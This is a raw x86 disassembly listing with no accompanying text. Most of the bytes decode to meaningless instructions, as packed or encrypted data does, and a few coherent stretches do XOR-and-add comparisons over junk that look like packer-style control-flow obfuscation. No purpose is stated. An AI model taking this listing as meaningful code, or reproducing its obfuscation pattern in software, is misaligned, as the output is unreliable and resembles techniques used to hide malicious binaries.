  407c32:	sbb    ebx,DWORD PTR [ecx]
  407c34:	sub    ebp,esi
  407c36:	push   esi
  407c37:	and    eax,DWORD PTR [ecx+ebx*2]
  407c3a:	mov    bl,bh
  407c3c:	ja     0x407c2b
  407c3e:	out    dx,al
  407c3f:	adc    BYTE PTR ds:0x458be42f,bl
  407c45:	in     al,0xf
  407c47:	scas   eax,DWORD PTR es:[edi]
  407c48:	shr    DWORD PTR [ebx],0xe0
  407c4b:	mov    DWORD PTR [ebp-0x24],esp
  407c4e:	jmp    0x407dd7
  407c53:	dec    esi
  407c54:	cli    
  407c55:	sbb    al,0xe
  407c57:	test   al,0xda
  407c59:	outs   dx,BYTE PTR ds:[esi]
  407c5a:	jp     0x407c98
  407c5c:	out    0x6d,eax
  407c5e:	shl    BYTE PTR [ebp+0x6],1
  407c61:	out    0x82,eax
  407c63:	xor    esp,DWORD PTR [esi]
  407c65:	jl     0x407ce3
  407c67:	call   0xdabcf8eb
  407c6c:	jmp    0x1259:0xb1f18137
  407c73:	mov    eax,ds:0xfad3ef3f
  407c78:	loope  0x407c4b
  407c7a:	fbld   TBYTE PTR [ecx]
  407c7c:	jbe    0x407ca9
  407c7e:	jnp    0x407c46
  407c80:	rol    BYTE PTR [esi],0x2d
  407c83:	pop    esp
  407c84:	sti    
  407c85:	pop    ds
  407c86:	dec    ebx
  407c87:	das    
  407c88:	sbb    bh,BYTE PTR fs:[esi+0x7b7bc36c]
  407c8f:	retf   
  407c90:	xchg   esp,esi
  407c92:	xor    edi,ebp
  407c94:	mov    ch,0x7
  407c96:	inc    edx
  407c97:	out    dx,eax
  407c98:	sbb    BYTE PTR [esi-0xebf640c],ch
  407c9e:	and    cl,BYTE PTR [ecx-0x17]
  407ca1:	cdq    
  407ca2:	and    BYTE PTR [ebx+0x65],cl
  407ca5:	cmc    
  407ca6:	or     cl,BYTE PTR [edi+0x1e65e43f]
  407cac:	adc    al,0xdb
  407cae:	mov    al,ds:0x6eaa965b
  407cb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cb4:	je     0x407d17
  407cb6:	adc    eax,0x137e6e86
  407cbb:	mov    dl,BYTE PTR [ecx-0x3f]
  407cbe:	xchg   ebx,eax
  407cbf:	xchg   DWORD PTR [ebp-0x7553786a],esi
  407cc5:	lods   al,BYTE PTR ds:[esi]
  407cc6:	dec    ecx
  407cc7:	out    dx,eax
  407cc8:	inc    esp
  407cc9:	lahf   
  407cca:	(bad)  
  407ccb:	gs xchg ebx,eax
  407ccd:	out    dx,al
  407cce:	leave  
  407ccf:	aaa    
  407cd0:	push   cs
  407cd1:	into   
  407cd2:	pushf  
  407cd3:	push   ss
  407cd4:	inc    ebp
  407cd5:	adc    al,0xb9
  407cd7:	imul   ecx,esi,0x79
  407cda:	and    eax,0x2c88cf0a
  407cdf:	stc    
  407ce0:	lock push edx
  407ce2:	jae    0x407d18
  407ce4:	pop    eax
  407ce5:	adc    al,0x48
  407ce7:	pusha  
  407ce8:	je     0x407d0c
  407cea:	pop    ds
  407ceb:	mov    ah,0xe0
  407ced:	cmp    DWORD PTR [ebx+ebx*4+0x1e],edi
  407cf1:	int    0x57
  407cf3:	sbb    eax,ebp
  407cf5:	sub    al,BYTE PTR [ebx+0x30a672eb]
  407cfb:	jno    0x407d69
  407cfd:	mov    edi,0xc900f22d
  407d02:	sti    
  407d03:	(bad)  
  407d04:	cli    
  407d05:	test   BYTE PTR [eax+0x596859ca],al
  407d0b:	inc    esi
  407d0c:	outs   dx,BYTE PTR ds:[esi]
  407d0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d0e:	add    ebx,DWORD PTR [ebx-0x75d9f679]
  407d14:	mov    edi,0xbb88e767
  407d19:	or     eax,0x121a781f
  407d1e:	cmp    al,ah
  407d20:	xlat   BYTE PTR ds:[ebx]
  407d21:	mov    edi,0x2cddb6f5
  407d26:	(bad)  
  407d27:	outs   dx,BYTE PTR ds:[esi]
  407d28:	arpl   sp,ax
  407d2a:	lods   al,BYTE PTR ds:[esi]
  407d2b:	mov    edi,0x63c63bb0
  407d30:	jmp    0x407cfc
  407d32:	sbb    eax,DWORD PTR [ebx]
  407d34:	hlt    
  407d35:	push   es
  407d36:	js     0x407d3f
  407d38:	out    0xb3,al
  407d3a:	daa    
  407d3b:	xor    eax,0xb0b9ddb2
  407d40:	out    dx,eax
  407d41:	aas    
  407d42:	sub    DWORD PTR [edi],edi
  407d44:	mov    eax,DWORD PTR [ebp+0x1efee7b4]
  407d4a:	or     DWORD PTR [esi+0x3d1bd7bd],esp
  407d50:	sbb    eax,0x7d89747e
  407d56:	ja     0x407d4b
  407d58:	cmp    DWORD PTR [ebp-0x7e2f6040],edi
  407d5e:	mov    ch,0x52
  407d60:	push   ebp
  407d61:	retf   
  407d62:	and    BYTE PTR [esi-0x31],al
  407d65:	mov    ds:0x219bb1ff,eax
  407d6a:	out    dx,eax
  407d6b:	rcl    BYTE PTR [esi],0x8e
  407d6e:	xchg   edx,eax
  407d6f:	dec    esi
  407d70:	sub    esp,ebx
  407d72:	cmp    eax,0x5e79e523
  407d77:	jmp    0x800c:0x99257497
  407d7e:	and    DWORD PTR [esi],0xffffffc6
  407d81:	psubb  mm3,QWORD PTR [ebp+0x1435d68a]
  407d88:	(bad)  
  407d8a:	(bad)  
  407d8b:	sti    
  407d8c:	mov    cl,0xe2
  407d8e:	and    BYTE PTR [esi+0x27f39ac],al
  407d94:	cmp    ecx,ecx
  407d96:	(bad)  
  407d97:	or     bh,BYTE PTR [ecx+ebx*8]
  407d9a:	call   0x87a7:0xb13b122c
  407da1:	clc    
  407da2:	mov    BYTE PTR [esi-0x34],0xce
  407da6:	or     ebx,eax
  407da8:	push   esp
  407da9:	and    ah,BYTE PTR [edi+0x1629a5dd]
  407daf:	or     cl,BYTE PTR [ecx-0x71]
  407db2:	pop    esp
  407db3:	jnp    0x407d69
  407db5:	dec    ecx
  407db6:	es xchg edi,ebx
  407db9:	cwde   
  407dba:	or     DWORD PTR [eax],eax
  407dbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dbd:	or     edx,esp
  407dbf:	test   DWORD PTR [ebx+0x61b76b51],0xe2db8e69
  407dc9:	adc    al,0x28
  407dcb:	mov    dl,0x45
  407dcd:	into   
  407dce:	ss and eax,0x750be0af
  407dd4:	jg     0x407db4
  407dd6:	dec    esi
  407dd7:	mov    eax,DWORD PTR [ebp-0x4]
  407dda:	mov    ecx,0x7510857
  407ddf:	xor    eax,ecx
  407de1:	mov    edx,0x32729e
  407de6:	add    eax,edx
  407de8:	jmp    0x407f71
  407ded:	push   0xffffffd5
  407def:	mov    ebp,0x7d64bd94
  407df4:	aad    0x16
  407df6:	sbb    bl,BYTE PTR [esi-0xc564572]
  407dfc:	and    ebp,DWORD PTR [edi-0x178383c7]
  407e02:	jg     0x407e80
  407e04:	jl     0x407dcb
  407e06:	daa    
  407e07:	sub    eax,0xa7595e46
  407e0c:	mov    ecx,0x61661e36
  407e11:	sub    al,0x27
  407e13:	fsubr  st(4),st
  407e15:	mov    ebx,0xd532f9a3
  407e1a:	cmp    bh,ah
  407e1c:	sub    eax,DWORD PTR [ecx]
  407e1e:	jno    0x407da8
  407e20:	push   bp
  407e22:	fwait
  407e23:	lea    eax,[edi+0x15ad012]
  407e29:	sbb    ecx,DWORD PTR [eax]
  407e2b:	popa   
  407e2c:	xor    al,0xc3
  407e2e:	jmp    0x407dea
  407e30:	xlat   BYTE PTR ds:[ebx]
  407e31:	mov    WORD PTR [esi-0x7f],ds
  407e34:	xor    cl,bl
  407e36:	test   BYTE PTR [ecx],dl
  407e38:	add    DWORD PTR [edx],edi
  407e3a:	mov    esi,0xbc2777c3
  407e3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e40:	mov    ecx,0x52565c57
  407e45:	in     al,0x4f
  407e47:	daa    
  407e48:	adc    DWORD PTR [ecx-0x4f],0x762f4922
  407e4f:	sbb    BYTE PTR [esi],0x6f
  407e52:	xchg   BYTE PTR [edi+0x6f],bh
  407e55:	cmp    al,0xda
  407e57:	sub    eax,0x11357aa0
  407e5c:	jnp    0x407e44
  407e5e:	repnz in al,0x5a
  407e61:	lods   al,BYTE PTR ds:[esi]
  407e62:	jg     0x407ee3
  407e64:	sbb    al,ch
  407e66:	mov    esi,edi
  407e68:	or     edx,DWORD PTR [ebp+0x38ca559a]
  407e6e:	push   0xfffffffc
  407e70:	(bad)  
  407e71:	lock out dx,eax
  407e73:	mov    bl,0xc6
  407e75:	fild   QWORD PTR [edi+esi*8-0x25]
  407e79:	sub    al,0x1c
  407e7b:	cmp    cl,BYTE PTR [ebx-0x10]
  407e7e:	push   es
  407e7f:	lods   eax,DWORD PTR ds:[esi]
  407e80:	fwait
  407e81:	into   
  407e82:	out    dx,eax
  407e83:	xchg   esp,eax
  407e84:	push   ecx
  407e85:	inc    esi
  407e86:	dec    eax
  407e87:	mov    eax,0x437ec962
  407e8c:	sbb    DWORD PTR ds:0x30f4b80,edi
  407e92:	pop    es
  407e93:	xor    DWORD PTR [edx+0x6d],ebp
  407e96:	xor    DWORD PTR [edx-0x6d1ead4],eax
  407e9c:	ins    DWORD PTR es:[edi],dx
  407e9d:	adc    DWORD PTR ds:0x56e83fe2,ebp
  407ea3:	xchg   ecx,eax
  407ea4:	lods   al,BYTE PTR ds:[esi]
  407ea5:	xor    eax,0x57cd66b6
  407eaa:	mov    edx,0x59ccd9a5
  407eaf:	mov    al,0x9b
  407eb1:	mov    eax,0xfe86f2dc
  407eb6:	push   0xffffffd1
  407eb8:	push   edi
  407eb9:	sahf   
  407eba:	iret   
  407ebb:	push   edx
  407ebc:	or     DWORD PTR [ecx+0x1d],ebx
  407ebf:	sub    DWORD PTR [ecx+0x286eefaa],esi
  407ec5:	je     0x407ee3
  407ec7:	int    0xf9
  407ec9:	or     ah,BYTE PTR ds:0x93ebc06
  407ecf:	push   ds
  407ed0:	push   DWORD PTR [esi-0x38]
  407ed3:	mov    cl,0x13
  407ed5:	add    dl,BYTE PTR [edi+0xb]
  407ed8:	xchg   edi,eax
  407ed9:	mov    bl,0x96
  407edb:	adc    al,0xfd
  407edd:	push   ebp
  407ede:	arpl   WORD PTR [ebp-0x6e],dx
  407ee1:	add    al,0x8a
  407ee3:	in     al,0xa6
  407ee5:	(bad)  
  407ee6:	pop    ebx
  407ee7:	sbb    eax,0x3109bd2a
  407eec:	add    BYTE PTR [edx],ch
  407eee:	jmp    0x407eeb
  407ef0:	or     DWORD PTR [edi+0x3ce187b9],ebx
  407ef6:	imul   ebp,DWORD PTR [ebp-0x1b93d677],0xffffffa4
  407efd:	idiv   DWORD PTR [edi-0x6b8b55bc]
  407f03:	push   ebx
  407f04:	scas   eax,DWORD PTR es:[edi]
  407f05:	lahf   
  407f06:	sti    
  407f07:	clc    
  407f08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f09:	lds    esi,FWORD PTR [edi+0x24]
  407f0c:	pop    eax
  407f0d:	push   esi
  407f0e:	out    0x44,eax
  407f10:	je     0x407f31
  407f12:	mov    bl,0xbd
  407f14:	sbb    DWORD PTR [esi],edx
  407f16:	aad    0x6a
  407f18:	or     al,0xfe
  407f1a:	pop    esi
  407f1b:	rcr    ebp,0x8f
  407f1e:	push   ds
  407f1f:	aam    0x64
  407f21:	jp     0x407f13
  407f23:	jb     0x407f5e
  407f25:	jns    0x407f00
  407f27:	loope  0x407f6e
  407f29:	jmp    0x407f3c
  407f2b:	dec    ecx
  407f2c:	fs push cs
  407f2e:	pop    ds
  407f2f:	stc    
  407f30:	in     al,dx
  407f31:	pop    edx
  407f32:	(bad)  
  407f34:	fwait
  407f35:	aas    
  407f36:	ss call 0x4e3556ba
  407f3c:	js     0x407f5b
  407f3e:	bound  eax,QWORD PTR [esi-0xb]
  407f41:	sub    eax,0x12e49484
  407f47:	ret    
  407f48:	push   edx
  407f49:	fdivr  st,st(7)
  407f4b:	push   esi
  407f4c:	addr16 loope 0x407f69
  407f4f:	cs jne 0x407eee
  407f52:	adc    esi,DWORD PTR [ecx+0x493abe85]
  407f58:	dec    ebp
  407f59:	call   0xf494:0x2343e002
  407f60:	add    DWORD PTR [edx],0xb2eb5be9
  407f66:	mov    ch,0xd
  407f68:	int    0x7e
  407f6a:	jnp    0x407fde
  407f6c:	cmp    BYTE PTR [eax-0x76902bee],cl
  407f72:	inc    ebp
  407f73:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  407f79:	add    eax,edx
  407f7b:	mov    edx,DWORD PTR [ebp+0x14]
  407f7e:	imul   eax,DWORD PTR [edx]
  407f81:	mov    edx,DWORD PTR [ebp-0x4]
  407f84:	xor    edx,ecx
  407f86:	mov    ecx,DWORD PTR [ebp+0x8]
  407f89:	lea    ecx,[edx+ecx*1+0x32729e]
  407f90:	cmp    ecx,eax
  407f92:	je     0x4087b6
  407f98:	mov    edi,DWORD PTR [ebp-0x18]
  407f9b:	mov    eax,DWORD PTR [ebp+0x8]
  407f9e:	mov    edx,DWORD PTR [ebp+0x14]
  407fa1:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  407fa5:	mov    ecx,0x7510857
  407faa:	xor    edx,edx
  407fac:	xor    edi,ecx
  407fae:	mov    esi,0x32729e
  407fb3:	add    edi,esi
  407fb5:	jmp    0x40813e
  407fba:	je     0x40800f
  407fbc:	jne    0x407fa1
  407fbe:	ins    DWORD PTR es:[edi],dx
  407fbf:	gs out 0x7b,al
  407fc2:	aam    0xcc
  407fc4:	pop    es
  407fc5:	sbb    ecx,DWORD PTR [bx+0x8]
  407fc9:	int    0x1b
  407fcb:	cmp    edi,DWORD PTR [esp+edi*2-0x18]
  407fcf:	jg     0x40804d
  407fd1:	jl     0x408049
  407fd3:	iret   
  407fd4:	lock aad 0xdc
  407fd7:	sahf   
  407fd8:	cld    
  407fd9:	ror    DWORD PTR [ebx+0x6e],cl
  407fdc:	fs push eax
  407fde:	mov    edx,0x26f0b1c
  407fe3:	xchg   edi,eax
  407fe4:	outs   dx,DWORD PTR ds:[esi]
  407fe5:	retf   
  407fe6:	ror    DWORD PTR ds:0x5474fd6a,0x53
  407fed:	or     ecx,DWORD PTR [eax+ebp*2+0x39572afc]
  407ff4:	gs sbb edx,esi
  407ff7:	fdivr  QWORD PTR [ebp-0x2a6b38cf]
  407ffd:	inc    ecx
  407ffe:	pusha  
  407fff:	xchg   ecx,eax
  408000:	cmp    ebx,DWORD PTR [ecx]
  408002:	cld    
  408003:	imul   ebp,DWORD PTR [ebx+edi*8+0x6facbd5d],0xd11dafc9
  40800e:	scas   eax,DWORD PTR es:[edi]
  40800f:	and    BYTE PTR [ebp+ebx*1-0x1f],ch
  408013:	fwait
  408014:	add    DWORD PTR [ebx+0x7b],edx
  408017:	mov    ebx,0x5d31529d
  40801c:	(bad)  
  40801d:	push   edi
  40801e:	shl    esi,cl
  408020:	shl    ah,1
  408022:	loop   0x40801a
  408024:	loope  0x40802c
  408026:	rcl    dl,1
  408028:	cli    
  408029:	jge    0x40801f
  40802b:	inc    esi
  40802c:	xchg   esp,eax
  40802d:	jo     0x4080ad
  40802f:	pop    ebx
  408030:	pop    ebp
  408031:	cdq    
  408032:	jnp    0x40806a
  408034:	mov    ah,0x9a
  408036:	dec    esi
  408037:	jg     0x407fbd
  408039:	fsub   QWORD PTR [eax]
  40803b:	xor    ah,BYTE PTR [edi+edi*8-0x68d02230]
  408042:	out    0xe5,eax
  408044:	push   0x591a6e9c
  408049:	mov    ch,0x6a
  40804b:	mov    ebp,0xded39602
  408050:	jl     0x40802f
  408052:	cmp    esi,DWORD PTR [esp+eax*2]
  408055:	and    eax,0x871af71c
  40805a:	in     al,dx
  40805b:	test   BYTE PTR [edx+ebx*2+0x8a2371f],bl
  408062:	or     BYTE PTR [eax+0x45],dh
  408065:	sbb    eax,0x1f623c7e
  40806a:	sub    ch,bl
  40806c:	mov    ds:0xd3c6ba1d,eax
  408071:	cmp    al,0x4b
  408073:	neg    BYTE PTR [eax+0x6c]
  408076:	sub    esp,DWORD PTR [eax-0x40]
  408079:	jmp    0xa5018ee0
  40807e:	inc    edx
  40807f:	add    DWORD PTR [ecx+0x6aa9114e],ebx
  408085:	arpl   WORD PTR [ebp-0x3bec250d],ax
  40808b:	xor    eax,DWORD PTR [esi]
  40808d:	or     dh,bl
  40808f:	jmp    0x408045
  408091:	pop    ecx
  408092:	addr16 sub eax,0x5214e571
  408098:	inc    eax
  408099:	lods   al,BYTE PTR ds:[esi]
  40809a:	push   ebx
  40809b:	lds    edx,FWORD PTR [ebp-0x34]
  40809e:	inc    edi
  40809f:	and    DWORD PTR [ecx],ebp
  4080a1:	lea    ecx,[edi-0x28c69496]
  4080a7:	sub    al,0x64
  4080a9:	iret   
  4080aa:	add    BYTE PTR cs:[esi+0x3f165692],bl
  4080b1:	add    ebp,DWORD PTR [ebx-0x4825335]
  4080b7:	sbb    cl,BYTE PTR ds:[ecx]
  4080ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080bb:	out    dx,eax
  4080bc:	js     0x408057
  4080be:	out    dx,al
  4080bf:	out    dx,al
  4080c0:	add    eax,0x3d194607
  4080c5:	jbe    0x4080b2
  4080c7:	jnp    0x40808c
  4080c9:	push   ebp
  4080ca:	jb     0x4080ec
  4080cc:	shl    BYTE PTR [eax],cl
  4080ce:	fwait
  4080cf:	inc    ebx
  4080d0:	out    0x4,eax
  4080d2:	pop    edi
  4080d3:	stos   BYTE PTR es:[edi],al
  4080d4:	jl     0x408113
  4080d6:	jl     0x408139
  4080d8:	mov    eax,ds:0x60af2ca8
  4080dd:	lock cwde 
  4080df:	pop    edx
  4080e0:	sub    BYTE PTR [eax],bh
  4080e2:	out    dx,eax
  4080e3:	push   esi
  4080e4:	enter  0x94b1,0xf9
  4080e8:	cmp    eax,esi
  4080ea:	pop    esi
  4080eb:	xchg   ebp,eax
  4080ec:	mov    ecx,0xaf74fe1f
  4080f1:	cmp    al,0x80
  4080f3:	rol    al,cl
  4080f5:	pushf  
  4080f6:	rcl    DWORD PTR [eax-0x1],1
  4080f9:	test   DWORD PTR [edx-0x1c3e4253],0x87d786ad
  408103:	(bad)  
  408104:	cwde   
  408105:	daa    
  408106:	jo     0x408092
  408108:	cli    
  408109:	ret    0x74ce
  40810c:	jmp    0x4080ae
  40810e:	ret    
  40810f:	js     0x4080a4
  408111:	add    al,cl
  408113:	int3   
  408114:	cmp    BYTE PTR [edx-0x5a163ae0],bh
  40811a:	out    0xbf,al
  40811c:	or     cl,dl
  40811e:	scas   eax,DWORD PTR es:[edi]
  40811f:	add    eax,0x1da2d680
  408124:	pop    ds
  408125:	call   0x2fd2bf86
  40812a:	clc    
  40812b:	xchg   esp,eax
  40812c:	mov    gs,WORD PTR [esi-0x23]
  40812f:	xchg   esi,ebp
  408131:	or     edx,DWORD PTR gs:[edx]
  408134:	adc    eax,0x3d8b970f
  408139:	push   cs
  40813a:	aaa    
  40813b:	into   
  40813c:	xchg   esp,eax
  40813d:	int    0xf7
  40813f:	test   DWORD PTR [ebx-0x2ecc03ab],0x9e02848d
  408149:	jb     0x40817d
  40814b:	add    BYTE PTR [ebx+0x7d8b0855],cl
  408151:	fmul   QWORD PTR [ecx+0x458b9704]
  408157:	call   0x3348d6e7
  40815c:	ror    DWORD PTR [ebp+0x729e1084],0x32
  408163:	add    BYTE PTR [ecx+0x458b0845],cl
  408169:	call   0x420657
  40816e:	add    BYTE PTR [esi-0x5c21b48],bl
  408174:	jge    0x4081cb
  408176:	mov    ebx,0x5d2a391f
  40817b:	mov    WORD PTR gs:[ecx+0x7c3af700],cs
  408182:	jl     0x40816c
  408184:	jg     0x408202
  408186:	jl     0x40816f
  408188:	jp     0x4081f2
  40818a:	jbe    0x408149
  40818c:	add    DWORD PTR [ecx-0x4edb3b7d],esp
  408192:	push   esp
  408193:	sbb    DWORD PTR [ebx+eiz*1],eax
  408196:	add    BYTE PTR [edi],dl
  408198:	xor    al,0x84
  40819a:	je     0x4081bf
  40819c:	mov    esi,0xa593e2e2
  4081a1:	mov    eax,0x3dc030e3
  4081a6:	add    eax,0xa5aa5e96
  4081ab:	xor    edi,DWORD PTR [ebx]
  4081ad:	clc    
  4081ae:	scas   al,BYTE PTR es:[edi]
  4081af:	mov    esp,DWORD PTR [esi]
  4081b1:	sub    al,0xf6
  4081b3:	clc    
  4081b4:	xor    eax,0x6a182693
  4081b9:	enter  0xf2a0,0xdb
  4081bd:	stos   DWORD PTR es:[edi],eax
  4081be:	cmp    BYTE PTR [esi+0x22],dl
  4081c1:	push   esp
  4081c2:	shr    BYTE PTR [eax-0x19],0x61
  4081c6:	(bad)  
  4081c8:	inc    eax
  4081c9:	jmp    0x3125:0x9096f708
  4081d0:	retf   0x4ef6
  4081d3:	xchg   esp,eax
  4081d4:	pushf  
  4081d5:	push   edi
  4081d6:	jb     0x408168
  4081d8:	mov    ebp,0xfdf689a8
  4081dd:	fst    QWORD PTR [eax]
  4081df:	dec    ebp
  4081e0:	push   0xffffff89
  4081e2:	std    
  4081e3:	in     eax,dx
  4081e4:	xor    al,0xbf
  4081e6:	call   0x541c8aef
  4081eb:	call   0x5094965c
  4081f0:	pop    edx
  4081f1:	stos   DWORD PTR es:[edi],eax
  4081f2:	popa   
  4081f3:	pop    eax
  4081f4:	or     eax,DWORD PTR [ecx-0x6b]
  4081f7:	jo     0x408217
  4081f9:	fucomp st(1)
  4081fb:	scas   eax,DWORD PTR es:[edi]
  4081fc:	lds    eax,FWORD PTR [ebx+edi*4-0x4d3032f0]
  408203:	mov    ch,0xe8
  408205:	mov    al,ds:0xe4ae9ca1
  40820a:	fucomp st(5)
  40820c:	dec    ebp
  40820d:	loop   0x4081b2
  40820f:	es push esp
  408211:	inc    edx
  408212:	xchg   edx,eax
  408213:	xchg   ecx,eax
  408214:	adc    al,0xe2
  408216:	ss cs nop
  408219:	test   al,0x61
  40821b:	imul   ebp,edi,0x4b450b97
  408221:	mov    dl,0x24
  408223:	fisttp WORD PTR ds:0x2be50bf6
  408229:	push   cs
  40822a:	inc    edx
  40822b:	out    dx,al
  40822c:	mov    cl,0x2b
  40822e:	push   esp
  40822f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408230:	push   ss
  408231:	cdq    
  408232:	(bad)  
  408233:	xchg   ebx,eax
  408234:	je     0x408283
  408236:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408237:	out    0xb8,eax
  408239:	cmp    BYTE PTR [ecx+0x3cb3d4d3],0x6f
  408240:	in     al,0xbe
  408242:	lea    ebp,[si]
  408245:	adc    eax,0xa167bf76
  40824a:	or     eax,0x3ac2d47b
  40824f:	inc    dx
  408251:	sub    dh,BYTE PTR [edi]
  408253:	ins    DWORD PTR es:[edi],dx
  408254:	(bad)  
  408255:	sub    DWORD PTR [ebp-0x3d],eax
  408258:	cs pop edi
  40825a:	test   DWORD PTR [edi+0x2b],eax
  40825d:	xor    dh,BYTE PTR [edi-0x5]
  408260:	push   ebx
  408261:	inc    ebp
  408262:	out    dx,al
  408263:	or     BYTE PTR [esi-0x75],dl
  408266:	sbb    dl,bh
  408268:	push   DWORD PTR [ecx]
  40826a:	imul   ebx,ebx,0xffffff93
  40826d:	or     al,0x3c
  40826f:	pop    edi
  408270:	aam    0x4d
  408272:	test   eax,0x17641a49
  408277:	stc    
  408278:	jns    0x4081ff
  40827a:	adc    al,BYTE PTR [ebp-0xbf6c604]
  408280:	pop    ebx
  408281:	test   eax,0x34b601b4
  408286:	push   esp
  408287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408288:	aas    
  408289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40828a:	xor    eax,0xf78b83b1
  40828f:	(bad)  
  408290:	ins    BYTE PTR es:[edi],dx
  408291:	jmp    0x4082e4
  408293:	add    al,0x3f
  408295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408296:	imul   ecx,DWORD PTR [edi+0x71],0x33a5fc65
  40829d:	pop    edx
  40829e:	inc    eax
  40829f:	adc    eax,0x14155f00
  4082a4:	cmp    DWORD PTR [esi],edx
  4082a6:	in     al,0xcc
  4082a8:	out    0x24,al
  4082aa:	mov    ah,0x8e
  4082ac:	push   0x63
  4082ae:	mov    ds:0xac27649a,al
  4082b3:	dec    edx
  4082b4:	jmp    0x371d67b4
  4082b9:	jg     0x408314
  4082bb:	dec    ebx
  4082bc:	cld    
  4082bd:	cmp    eax,0x99df6efb
  4082c2:	loope  0x40831e
  4082c4:	sbb    bl,bl
  4082c6:	xor    BYTE PTR ds:[eax+0x6c],cl
  4082ca:	xchg   ah,dl
  4082cc:	and    dl,ch
  4082ce:	mov    ah,0xe8
  4082d0:	fisub  DWORD PTR [eax]
  4082d2:	sbb    BYTE PTR [ecx+0x64],dl
  4082d5:	add    bl,dl
  4082d7:	fist   WORD PTR [ebx]
  4082d9:	(bad)  
  4082da:	jg     0x4082e9
  4082dc:	push   ecx
  4082dd:	dec    esp
  4082de:	sbb    edx,DWORD PTR [ebx-0x2caed307]
  4082e4:	xchg   BYTE PTR [edx],ch
  4082e6:	stos   BYTE PTR es:[edi],al
  4082e7:	adc    eax,0xfce7fd98
  4082ec:	mov    esi,0xa8bb1566
  4082f1:	clc    
  4082f2:	or     BYTE PTR [ebx-0x7b16ebab],0x1
  4082f9:	add    BYTE PTR [eax],al
  4082fb:	ret    0xc507
  4082fe:	out    0xdd,eax
  408300:	std    
  408301:	cli    
  408302:	cmp    eax,0xbb29729
  408307:	rol    DWORD PTR [eax+0x3d63486c],cl
  40830d:	jl     0x40838b
  40830f:	call   0xbbbcff93
  408314:	cmp    eax,0x91e22703
  408319:	jle    0x40837b
  40831b:	sbb    eax,0x6c37bfdf
  408320:	pop    ebx
  408321:	xchg   edx,eax
  408322:	or     cl,bh
  408324:	cmp    BYTE PTR [ebp+0x27],0x2f
  408328:	(bad)  
  408329:	pop    eax
  40832a:	ficom  DWORD PTR [edx-0x3fbd0823]
  408330:	sbb    esp,DWORD PTR [esi-0x5b]
  408333:	inc    eax
  408334:	jmp    0xa40e18af
  408339:	jecxz  0x4082e8
  40833b:	cld    
  40833c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40833d:	push   ds
  40833e:	dec    edx
  40833f:	pop    esi
  408340:	das    
  408341:	sub    al,0x52
  408343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408344:	jno    0x408321
  408346:	cmp    ecx,ecx
  408348:	pop    esi
  408349:	jmp    0x7cf36f26
  40834e:	fiadd  DWORD PTR [ebp+0x77]
  408351:	aaa    
  408352:	cli    
  408353:	rol    DWORD PTR [ecx+0x1d],0x3c
  408357:	test   al,0x5
  408359:	loop   0x4083a3
  40835b:	pop    esp
  40835c:	inc    esp
  40835d:	mov    dh,0x28
  40835f:	mov    BYTE PTR [edx-0x5908ee8d],cl
  408365:	cwde   
  408366:	jne    0x40830d
  408368:	dec    edi
  408369:	adc    BYTE PTR [ecx],0x42
  40836c:	push   edx
  40836d:	(bad)  
  40836f:	mov    cl,0xa
  408371:	push   esp
  408372:	cmp    edx,DWORD PTR [edx+edx*2]
  408375:	inc    ecx
  408376:	in     al,0xd
  408378:	sbb    esp,DWORD PTR [ecx-0x3280a1b3]
  40837e:	nop
  40837f:	push   edx
  408380:	jno    0x4083c3
  408382:	out    dx,eax
  408383:	fdivrp st(5),st
  408385:	inc    ebx
  408386:	fsub   DWORD PTR [eax-0x77]
  408389:	daa    
  40838a:	mov    ds:0xbe86ecff,eax
  40838f:	lods   al,BYTE PTR ds:[esi]
  408390:	jae    0x408355
  408392:	and    al,0x26
  408394:	push   dx
  408396:	jl     0x408318
  408398:	jp     0x4083d6
  40839a:	repnz call 0x8c18:0x84a2798
  4083a2:	inc    ebp
  4083a3:	pop    esp
  4083a4:	and    cl,BYTE PTR ds:0x32d0ae22
  4083aa:	xor    ecx,edi
  4083ac:	add    al,0x4f
  4083ae:	pusha  
  4083af:	jmp    0x4083aa
  4083b1:	adc    eax,0x80c73c6d
  4083b6:	test   BYTE PTR [ebx-0x13],dl
  4083b9:	inc    ebp
  4083ba:	sub    al,0x12
  4083bc:	repnz xlat BYTE PTR ds:[ebx]
  4083be:	mov    bl,0xe
  4083c0:	inc    ebx
  4083c1:	sub    al,0x6
  4083c3:	cli    
  4083c4:	jo     0x40838c
  4083c6:	adc    ecx,0xb079698d
  4083cc:	jae    0x4083be
  4083ce:	in     al,0x7e
  4083d0:	cmp    al,0x3c
  4083d2:	jge    0x408452
  4083d4:	inc    esp
  4083d5:	sbb    eax,DWORD PTR [esi]
  4083d7:	icebp  
  4083d8:	aas    
  4083d9:	and    bh,BYTE PTR [esi-0x59]
  4083dc:	loop   0x4083fe
  4083de:	stos   BYTE PTR es:[edi],al
  4083df:	push   ebp
  4083e0:	adc    DWORD PTR [ecx],ebp
  4083e2:	jle    0x4083a0
  4083e4:	into   
  4083e5:	pop    ss
  4083e6:	retf   0x33fb
  4083e9:	aaa    
  4083ea:	push   0xccfbf902
  4083ef:	in     eax,0xfc
  4083f1:	fcomp  QWORD PTR [esi]
  4083f3:	lods   eax,DWORD PTR ds:[esi]
  4083f4:	(bad)  
  4083f5:	popa   
  4083f6:	add    eax,0xdb52020c
  4083fb:	fdivr  QWORD PTR [esi-0x10cb7cb8]
  408401:	(bad)  
  408402:	call   0xdc80:0xa328adce
  408409:	xor    ah,BYTE PTR [ebx-0x74]
  40840c:	aam    0x38
  40840e:	(bad)  
  408410:	daa    
  408411:	loop   0x408448
  408413:	bound  edi,QWORD PTR gs:[esi+0x6c]
  408417:	aaa    
  408418:	pop    edx
